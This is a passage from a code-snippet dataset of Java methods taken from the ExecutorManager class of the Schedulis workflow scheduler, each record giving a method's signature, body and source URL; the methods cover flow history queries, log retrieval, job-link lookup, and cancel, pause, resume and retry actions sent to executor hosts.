Add run_date date for page display.\n    if(null != flows && !flows.isEmpty()){\n      flows.stream().forEach(executableFlow -> {\n        Map<String, String> repeatMap = executableFlow.getRepeatOption();\n        if(!repeatMap.isEmpty()){\n\n          Long recoverRunDate = Long.valueOf(String.valueOf(repeatMap.get(\"startTimeLong\")));\n\n          LocalDateTime localDateTime = new LocalDateTime(new Date(recoverRunDate)).minusDays(1);\n\n          Date date = localDateTime.toDate();\n\n          executableFlow.setUpdateTime(date.getTime());\n        }else{\n          Long runDate = executableFlow.getStartTime();\n          if(-1 != runDate){\n            LocalDateTime localDateTime = new LocalDateTime(new Date(runDate)).minusDays(1);\n\n            Date date = localDateTime.toDate();\n\n            executableFlow.setUpdateTime(date.getTime());\n          } else {\n            executableFlow.setUpdateTime(runDate);\n          }\n        }\n      });\n    }\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34404, "method_name": "getExecutableFlows", "class_name": "ExecutorManager", "params": ["Project", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getExecutableFlows(final Project project,\n      final String flowId, final int skip, final int size) throws ExecutorManagerException {\n    final List<ExecutableFlow> flows =\n        this.executorLoader.fetchFlowHistory(project.getId(), flowId, skip, size);\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34405, "method_name": "getExecutableFlows", "class_name": "ExecutorManager", "params": ["int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getExecutableFlows(final int skip, final int size)\n      throws ExecutorManagerException {\n    final List<ExecutableFlow> flows = this.executorLoader.fetchFlowHistory(skip, size);\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34406, "method_name": "getMaintainedExecutableFlows", "class_name": "ExecutorManager", "params": ["String", "List<Integer>", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getMaintainedExecutableFlows(String username, List<Integer> projectIds, int skip, int size)\n          throws ExecutorManagerException {\n    return this.executorLoader.fetchMaintainedFlowHistory(username, projectIds, skip, size);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34407, "method_name": "getExecutableFlowsQuickSearch", "class_name": "ExecutorManager", "params": ["String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getExecutableFlowsQuickSearch(final String flowIdContains,\n      final int skip, final int size) throws ExecutorManagerException {\n    final List<ExecutableFlow> flows =\n        this.executorLoader.fetchFlowHistoryQuickSearch(\n            '%' + flowIdContains + '%', null, skip, size);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34408, "method_name": "getMaintainedFlowsQuickSearch", "class_name": "ExecutorManager", "params": ["String", "int", "int", "String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getMaintainedFlowsQuickSearch(String flowIdContains, int skip, int size,\n                                                            String username, List<Integer> projectIds) throws ExecutorManagerException {\n    return this.executorLoader.fetchFlowHistoryQuickSearch('%' + flowIdContains + '%',\n            username, skip, size, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34409, "method_name": "getExecutableFlows", "class_name": "ExecutorManager", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getExecutableFlows(final String projContain, final String flowContain,\n                                                 final String execIdContain, final String userContain,\n                                                 final String status, final long begin, final long end,\n                                                 final int skip, final int size, int flowType) throws ExecutorManagerException {\n    final List<ExecutableFlow> flows =\n        this.executorLoader.fetchFlowHistory(projContain, flowContain, execIdContain, userContain,\n            status, begin, end, skip, size, flowType);\n\n    return flows;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34410, "method_name": "getMaintainedExecutableFlows", "class_name": "ExecutorManager", "params": ["String", "String", "String", "String", "String", "long", "long", "int", "int", "int", "String", "List<Integer>"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableFlow>", "snippet": "  public List<ExecutableFlow> getMaintainedExecutableFlows(String projContain, String flowContain, String execIdContain,\n                                                             String userContain, String status, long begin, long end,\n                                                             int skip, int size, int flowType, String username, List<Integer> projectIds)\n          throws ExecutorManagerException {\n    return this.executorLoader.fetchMaintainedFlowHistory(projContain, flowContain, execIdContain, userContain,\n            status, begin, end, skip, size, flowType, username, projectIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34411, "method_name": "getExecutableJobs", "class_name": "ExecutorManager", "params": ["Project", "String", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<ExecutableJobInfo>", "snippet": "  public List<ExecutableJobInfo> getExecutableJobs(final Project project,\n      final String jobId, final int skip, final int size) throws ExecutorManagerException {\n    final List<ExecutableJobInfo> nodes =\n        this.executorLoader.fetchJobHistory(project.getId(), jobId, skip, size);\n    return nodes;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34412, "method_name": "getExecutableJobsMoyenneRunTime", "class_name": "ExecutorManager", "params": ["Project", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "long", "snippet": "  public long getExecutableJobsMoyenneRunTime(final Project project,\n      final String jobId) throws ExecutorManagerException {\n    final List<ExecutableJobInfo> jobInfos =\n        this.executorLoader.fetchJobAllHistory(project.getId(), jobId);\n\n    long moyenne = 0;\n    long allRunTime = 0;\n    int successFlowNum = 0;\n    if (jobInfos != null) {\n      for (final ExecutableJobInfo info : jobInfos) {\n        if(Status.SUCCEEDED.equals(info.getStatus())){\n          successFlowNum += 1;\n          allRunTime += (info.getEndTime() - info.getStartTime());\n        }\n      }\n      if(allRunTime !=0 && successFlowNum !=0){\n        moyenne = allRunTime/successFlowNum;\n      }\n    }\n\n    return moyenne;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34413, "method_name": "getNumberOfJobExecutions", "class_name": "ExecutorManager", "params": ["Project", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumberOfJobExecutions(final Project project, final String jobId)\n      throws ExecutorManagerException {\n    return this.executorLoader.fetchNumExecutableNodes(project.getId(), jobId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34414, "method_name": "getNumberOfExecutions", "class_name": "ExecutorManager", "params": ["Project", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int getNumberOfExecutions(final Project project, final String flowId)\n      throws ExecutorManagerException {\n    return this.executorLoader.fetchNumExecutableFlows(project.getId(), flowId);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34415, "method_name": "getExecutableFlowLog", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData getExecutableFlowLog(final ExecutableFlow exFlow, final int offset,\n      final int length) throws ExecutorManagerException {\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        this.runningExecutions.get().get(exFlow.getExecutionId());\n    if (pair != null) {\n      final Pair<String, String> typeParam = new Pair<>(\"type\", \"flow\");\n      final Pair<String, String> offsetParam =\n          new Pair<>(\"offset\", String.valueOf(offset));\n      final Pair<String, String> lengthParam =\n          new Pair<>(\"length\", String.valueOf(length));\n\n      @SuppressWarnings(\"unchecked\") final Map<String, Object> result =\n          this.apiGateway.callWithReference(pair.getFirst(), ConnectorParams.LOG_ACTION,\n              typeParam, offsetParam, lengthParam);\n      return LogData.createLogDataFromObject(result);\n    } else {\n      final LogData value =\n          this.executorLoader.fetchLogs(exFlow.getExecutionId(), \"\", 0, offset, length);\n      return value;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34416, "method_name": "getLatestLogOffset", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "Long", "int", "User"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "Long", "snippet": "  public Long getLatestLogOffset(ExecutableFlow exFlow, String jobId, Long length, int attempt, User user) throws ExecutorManagerException {\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        this.runningExecutions.get().get(exFlow.getExecutionId());\n    if (pair != null) {\n      logger.info(\"get offset from local file.\");\n      Pair<String, String> jobIdParam = new Pair<>(\"jobId\", jobId);\n      Pair<String, String> lengthParam = new Pair<>(\"len\", String.valueOf(length));\n      Pair<String, String> attemptParam = new Pair<>(\"attempt\", String.valueOf(attempt));\n\n      Map<String, Object> ret = this.apiGateway.callWithReferenceByUser(pair.getFirst(), ConnectorParams.OFFSET_ACTION,\n              user.getUserId(), jobIdParam, lengthParam, attemptParam);\n      return Long.valueOf(ret.get(\"offset\").toString());\n    } else {\n      logger.info(\"get offset from db.\");\n      return this.executorLoader.getJobLogOffset(exFlow.getExecutionId(), jobId, attempt, length);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34417, "method_name": "getExecutionJobLog", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "LogData", "snippet": "  public LogData getExecutionJobLog(final ExecutableFlow exFlow, final String jobId,\n      final int offset, final int length, final int attempt) throws ExecutorManagerException {\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        this.runningExecutions.get().get(exFlow.getExecutionId());\n    if (pair != null) {\n      final Pair<String, String> typeParam = new Pair<>(\"type\", \"job\");\n      final Pair<String, String> jobIdParam =\n          new Pair<>(\"jobId\", jobId);\n      final Pair<String, String> offsetParam =\n          new Pair<>(\"offset\", String.valueOf(offset));\n      final Pair<String, String> lengthParam =\n          new Pair<>(\"length\", String.valueOf(length));\n      final Pair<String, String> attemptParam =\n          new Pair<>(\"attempt\", String.valueOf(attempt));\n\n      @SuppressWarnings(\"unchecked\") final Map<String, Object> result =\n          this.apiGateway.callWithReference(pair.getFirst(), ConnectorParams.LOG_ACTION,\n              typeParam, jobIdParam, offsetParam, lengthParam, attemptParam);\n      return LogData.createLogDataFromObject(result);\n    } else {\n      final LogData value =\n          this.executorLoader.fetchLogs(exFlow.getExecutionId(), jobId, attempt,\n              offset, length);\n      return value;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34418, "method_name": "getExecutionJobStats", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "List<Object>", "snippet": "  public List<Object> getExecutionJobStats(final ExecutableFlow exFlow, final String jobId,\n      final int attempt) throws ExecutorManagerException {\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        this.runningExecutions.get().get(exFlow.getExecutionId());\n    if (pair == null) {\n      return this.executorLoader.fetchAttachments(exFlow.getExecutionId(), jobId,\n          attempt);\n    }\n\n    final Pair<String, String> jobIdParam = new Pair<>(\"jobId\", jobId);\n    final Pair<String, String> attemptParam =\n        new Pair<>(\"attempt\", String.valueOf(attempt));\n\n    @SuppressWarnings(\"unchecked\") final Map<String, Object> result =\n        this.apiGateway.callWithReference(pair.getFirst(), ConnectorParams.ATTACHMENTS_ACTION,\n            jobIdParam, attemptParam);\n\n    @SuppressWarnings(\"unchecked\") final List<Object> jobStats = (List<Object>) result\n        .get(\"attachments\");\n\n    return jobStats;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34419, "method_name": "getJobLinkUrl", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getJobLinkUrl(final ExecutableFlow exFlow, final String jobId, final int attempt) {\n    if (!this.azkProps.containsKey(ConfigurationKeys.RESOURCE_MANAGER_JOB_URL) || !this.azkProps\n        .containsKey(ConfigurationKeys.HISTORY_SERVER_JOB_URL) || !this.azkProps\n        .containsKey(ConfigurationKeys.SPARK_HISTORY_SERVER_JOB_URL)) {\n      return null;\n    }\n\n    final String applicationId = getApplicationId(exFlow, jobId, attempt);\n    if (applicationId == null) {\n      return null;\n    }\n\n    final URL url;\n    final String jobLinkUrl;\n    boolean isRMJobLinkValid = true;\n\n    try {\n      url = new URL(this.azkProps.getString(ConfigurationKeys.RESOURCE_MANAGER_JOB_URL)\n          .replace(APPLICATION_ID, applicationId));\n      final String keytabPrincipal = requireNonNull(\n          this.azkProps.getString(ConfigurationKeys.AZKABAN_KERBEROS_PRINCIPAL));\n      final String keytabPath = requireNonNull(this.azkProps.getString(ConfigurationKeys\n          .AZKABAN_KEYTAB_PATH));\n      final HttpURLConnection connection = AuthenticationUtils.loginAuthenticatedURL(url,\n          keytabPrincipal, keytabPath);\n\n      try (final BufferedReader in = new BufferedReader(\n          new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n          if (FAILED_TO_READ_APPLICATION_PATTERN.matcher(inputLine).find()\n              || INVALID_APPLICATION_ID_PATTERN.matcher(inputLine).find()) {\n            this.logger.info(\n                \"RM job link is invalid or has expired for application_\" + applicationId);\n            isRMJobLinkValid = false;\n            break;\n          }\n        }\n      }\n    } catch (final Exception e) {\n      this.logger.error(\"Failed to get job link for application_\" + applicationId, e);\n      return null;\n    }\n\n    if (isRMJobLinkValid) {\n      jobLinkUrl = url.toString();\n    } else {\n      // If RM job link is invalid or has expired, fetch the job link from JHS or SHS.\n      if (exFlow.getExecutableNode(jobId).getType().equals(SPARK_JOB_TYPE)) {\n        jobLinkUrl =\n            this.azkProps.get(ConfigurationKeys.SPARK_HISTORY_SERVER_JOB_URL).replace\n                (APPLICATION_ID, applicationId);\n      } else {\n        jobLinkUrl =\n            this.azkProps.get(ConfigurationKeys.HISTORY_SERVER_JOB_URL).replace(APPLICATION_ID,\n                applicationId);\n      }\n    }\n\n    this.logger.info(\n        \"Job link url is \" + jobLinkUrl + \" for execution \" + exFlow.getExecutionId() + \", job \"\n            + jobId);\n    return jobLinkUrl;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34420, "method_name": "getApplicationId", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "  private String getApplicationId(final ExecutableFlow exFlow, final String jobId,\n      final int attempt) {\n    String applicationId;\n    boolean finished = false;\n    int offset = 0;\n    try {\n      while (!finished) {\n        final LogData data = getExecutionJobLog(exFlow, jobId, offset, 50000, attempt);\n        if (data != null) {\n          applicationId = findApplicationIdFromLog(data.getData());\n          if (applicationId != null) {\n            return applicationId;\n          }\n          offset = data.getOffset() + data.getLength();\n          this.logger.info(\"Get application ID for execution \" + exFlow.getExecutionId() + \", job\"\n              + \" \" + jobId + \", attempt \" + attempt + \", data offset \" + offset);\n        } else {\n          finished = true;\n        }\n      }\n    } catch (final ExecutorManagerException e) {\n      this.logger.error(\"Failed to get application ID for execution \" + exFlow.getExecutionId() +\n          \", job \" + jobId + \", attempt \" + attempt + \", data offset \" + offset, e);\n    }\n    return null;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34421, "method_name": "getExecutionJobMetaData", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "int", "int", "int"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "JobMetaData", "snippet": "  public JobMetaData getExecutionJobMetaData(final ExecutableFlow exFlow,\n      final String jobId, final int offset, final int length, final int attempt)\n      throws ExecutorManagerException {\n    final Pair<ExecutionReference, ExecutableFlow> pair =\n        this.runningFlows.get(exFlow.getExecutionId());\n    if (pair != null) {\n\n      final Pair<String, String> typeParam = new Pair<>(\"type\", \"job\");\n      final Pair<String, String> jobIdParam =\n          new Pair<>(\"jobId\", jobId);\n      final Pair<String, String> offsetParam =\n          new Pair<>(\"offset\", String.valueOf(offset));\n      final Pair<String, String> lengthParam =\n          new Pair<>(\"length\", String.valueOf(length));\n      final Pair<String, String> attemptParam =\n          new Pair<>(\"attempt\", String.valueOf(attempt));\n\n      @SuppressWarnings(\"unchecked\") final Map<String, Object> result =\n          this.apiGateway.callWithReference(pair.getFirst(), ConnectorParams.METADATA_ACTION,\n              typeParam, jobIdParam, offsetParam, lengthParam, attemptParam);\n      return JobMetaData.createJobMetaDataFromObject(result);\n    } else {\n      return null;\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34422, "method_name": "cancelFlow", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void cancelFlow(final ExecutableFlow exFlow, final String userId)\n      throws ExecutorManagerException {\n    synchronized (exFlow) {\n      if (this.runningExecutions.get().containsKey(exFlow.getExecutionId())) {\n        final Pair<ExecutionReference, ExecutableFlow> pair =\n            this.runningExecutions.get().get(exFlow.getExecutionId());\n        this.apiGateway.callWithReferenceByUser(pair.getFirst(), ConnectorParams.CANCEL_ACTION,\n            userId);\n      } else if (this.queuedFlows.hasExecution(exFlow.getExecutionId())) {//\u5982\u679c\u662f\u6b63\u5728\u6392\u961f\u7684Flow \u5c31\u76f4\u63a5\u5728\u8fd9\u8fb9\u5904\u7406\n        this.queuedFlows.dequeue(exFlow.getExecutionId());\n        this.executionFinalizer\n            .finalizeFlow(exFlow, \"Cancelled before dispatching to executor\", null);  // \u901a\u7528\u544a\u8b66\n      } else {\n        throw new ExecutorManagerException(\"Executor Id is[\"\n            + exFlow.getExecutionId() + \"] and its Flow[\" + exFlow.getFlowId()\n            + \"] has stop working.\");\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34423, "method_name": "resumeFlow", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void resumeFlow(final ExecutableFlow exFlow, final String userId)\n      throws ExecutorManagerException {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n          this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new ExecutorManagerException(\"Execution \"\n            + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n            + \" isn't running.\");\n      }\n      this.apiGateway\n          .callWithReferenceByUser(pair.getFirst(), ConnectorParams.RESUME_ACTION, userId);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34424, "method_name": "setFlowFailed", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "List<Pair>"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFlowFailed(ExecutableFlow exFlow, String userId, List<Pair<String, String>> param) throws Exception {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n              this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new Exception(\"Execution \"\n                + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n                + \" isn't running.\");\n      }\n      this.apiGateway.callForJsonObjectMap(pair.getFirst().getExecutor().get().getHost(),\n              pair.getFirst().getExecutor().get().getPort(), \"/executor\", param);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34425, "method_name": "setJobDisabled", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String setJobDisabled(ExecutableFlow exFlow, String userId, String request) throws Exception {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n              this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new Exception(\"Execution \"\n                + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n                + \" isn't running.\");\n      }\n      String url = \"http://\" + pair.getFirst().getExecutor().get().getHost() + \":\" + pair.getFirst().getExecutor().get().getPort() + \"/executor?\"\n              + \"action=\" + ConnectorParams.DISABLE_JOB_ACTION + \"&execid=\" + exFlow.getExecutionId() + \"&user=\" + userId;\n\n      return this.apiGateway.httpPost(url, request);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34426, "method_name": "retryFailedJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String retryFailedJobs(ExecutableFlow exFlow, String userId, String request) throws Exception {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n              this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new Exception(\"Execution \"\n                + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n                + \" isn't running.\");\n      }\n      String url = \"http://\" + pair.getFirst().getExecutor().get().getHost() + \":\" + pair.getFirst().getExecutor().get().getPort() + \"/executor?\"\n              + \"action=\" + ConnectorParams.RETRY_FAILED_JOBS_ACTION + \"&execid=\" + exFlow.getExecutionId() + \"&user=\" + userId;\n\n      return this.apiGateway.httpPost(url, request);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34427, "method_name": "skipFailedJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["Exception"], "modifiers": ["public"], "return_type": "String", "snippet": "  public String skipFailedJobs(ExecutableFlow exFlow, String userId, String request) throws Exception {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n              this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new Exception(\"Execution \"\n                + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n                + \" isn't running.\");\n      }\n      String url = \"http://\" + pair.getFirst().getExecutor().get().getHost() + \":\" + pair.getFirst().getExecutor().get().getPort() + \"/executor?\"\n              + \"action=\" + ConnectorParams.SKIP_FAILED_JOBS_ACTION + \"&execid=\" + exFlow.getExecutionId() + \"&user=\" + userId;\n\n      return this.apiGateway.httpPost(url, request);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34428, "method_name": "pauseFlow", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void pauseFlow(final ExecutableFlow exFlow, final String userId)\n      throws ExecutorManagerException {\n    synchronized (exFlow) {\n      final Pair<ExecutionReference, ExecutableFlow> pair =\n          this.runningExecutions.get().get(exFlow.getExecutionId());\n      if (pair == null) {\n        throw new ExecutorManagerException(\"Execution \"\n            + exFlow.getExecutionId() + \" of flow \" + exFlow.getFlowId()\n            + \" isn't running.\");\n      }\n      this.apiGateway\n          .callWithReferenceByUser(pair.getFirst(), ConnectorParams.PAUSE_ACTION, userId);\n    }\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34429, "method_name": "pauseExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void pauseExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_PAUSE_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34430, "method_name": "resumeExecutingJobs", "class_name": "ExecutorManager", "params": ["ExecutableFlow", "String", "String"], "throws": ["ExecutorManagerException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void resumeExecutingJobs(final ExecutableFlow exFlow, final String userId,\n      final String... jobIds) throws ExecutorManagerException {\n    modifyExecutingJobs(exFlow, ConnectorParams.MODIFY_RESUME_JOBS, userId,\n        jobIds);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/executor/ExecutorManager.java", "stars": "18", "class_props": {"extends": "EventHandler", "implements": ["ExecutorManagerAdapter"], "modifiers": ["public"]}}, {"id": 34431, "method_name": "retryFailures", "class_name": "ExecutorManager", "params": ["ExecutableFlow", 